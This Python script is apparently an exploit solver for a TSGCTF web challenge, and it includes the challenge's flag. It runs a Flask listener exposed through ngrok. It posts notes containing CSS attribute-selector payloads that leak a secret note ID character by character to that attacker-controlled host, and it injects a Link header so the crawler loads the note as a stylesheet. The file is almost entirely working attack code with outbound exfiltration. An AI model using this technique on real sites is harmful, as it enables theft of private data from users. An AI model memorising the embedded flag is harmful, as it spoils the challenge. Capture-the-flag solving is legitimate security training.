from flask import Flask, request
import requests
import urllib.parse
import string
import atexit
import json
import subprocess
import time
from threading import Timer
import sys
import os

assert len(sys.argv) >= 3, "insufficient arguments"
TARGET_BASE = "http://{}:{}".format(sys.argv[1], sys.argv[2])

FLAG = "TSGCTF{uo_uo_uo_uo_uoooooooo_uo_no_gawa_love}"
LEAK_LENGTH = 10
CHAR_CANDIDATES = string.ascii_letters + string.digits

EXPLOIT_BASE_ADDR = ""
app = Flask(__name__)
s = requests.Session()


def build_payload(prefix: str, candidates: "List[str]"):
    global EXPLOIT_BASE_ADDR
    assert EXPLOIT_BASE_ADDR != "", "EXPLOIT_BASE_ADDR is not set"

    payload = "{}"
    for candidate in candidates:
        id_prefix_to_try = prefix + candidate
        matcher = ''.join(map(lambda x: '\\' + hex(ord(x))
                              [2:], '/notes/' + id_prefix_to_try))
        payload += "a[href^={}] {{ background-image: url({}/leak?q={}); }}".format(
            matcher, EXPLOIT_BASE_ADDR, urllib.parse.quote(id_prefix_to_try))
    return payload


def post_note(title: str, description: str) -> str:
    r = s.post(TARGET_BASE + "/notes", data={
        "title": title,
        "description": description,
    }, headers={
        "content-type": "application/x-www-form-urlencoded"
    }, allow_redirects=False)
    assert r.status_code == 302, "invalid status code: {}".format(
        r.status_code)
    return r.headers['Location'].split('/notes/')[-1]


def report_note_as_stylesheet(id: str) -> None:
    header_value = '</notes/{}>; rel="stylesheet"; type="text/css"'.format(id)
    r = s.post(TARGET_BASE + "/tell", data={
        "path": "/?k=Link&v={}".format(urllib.parse.quote(header_value)),
    }, allow_redirects=False)
    assert r.status_code == 302, "invalid status code: {}".format(
        r.status_code)
    return None


@app.route("/start")
def start():
    p = build_payload("", CHAR_CANDIDATES)
    exploit_id = post_note("exploit", p)
    report_note_as_stylesheet(exploit_id)
    print("[info]: started exploit with a new note: {}/notes/{}".format(TARGET_BASE, exploit_id))
    return ""


@app.route("/leak")
def leak():
    leaked_id = request.args.get('q')
    if len(leaked_id) == LEAK_LENGTH:
        print("[+] leaked (full ID): {}".format(leaked_id))
        r = s.get(TARGET_BASE + "/notes/" + leaked_id)
        os._exit(0 if FLAG in r.text else 1)
    else:
        print("[info] leaked: {}{}".format(
            leaked_id, "*" * (LEAK_LENGTH - len(leaked_id))))

        p = build_payload(leaked_id, CHAR_CANDIDATES)
        exploit_id = post_note("exploit", p)
        report_note_as_stylesheet(exploit_id)
        print("[info]: invoked crawler with a new note: " + exploit_id)
    return ""


def run_ngrok(port):
    global EXPLOIT_BASE_ADDR

    ngrok = subprocess.Popen(["/usr/local/bin/ngrok", 'http',
                              "-log=stdout",  str(port)], stdout=subprocess.DEVNULL)
    atexit.register(ngrok.terminate)
    localhost_url = "http://localhost:4040/api/tunnels"
    while True:
        try:
            tunnel_url = requests.get(localhost_url).text
            j = json.loads(tunnel_url)

            tunnel_url = j['tunnels'][0]['public_url']
            tunnel_url = tunnel_url.replace("https", "http")
            EXPLOIT_BASE_ADDR = tunnel_url

            print("[info] ngrok tunnel was established")
            s.get("{}/start".format(EXPLOIT_BASE_ADDR))
            break
        except:
            time.sleep(1)


if __name__ == "__main__":
    print("[info] establishing a ngrok tunnel ...")
    thread = Timer(1, run_ngrok, args=(1337,))
    thread.setDaemon(True)
    thread.start()

    print("[info] running app ...")
    app.run(port=1337)
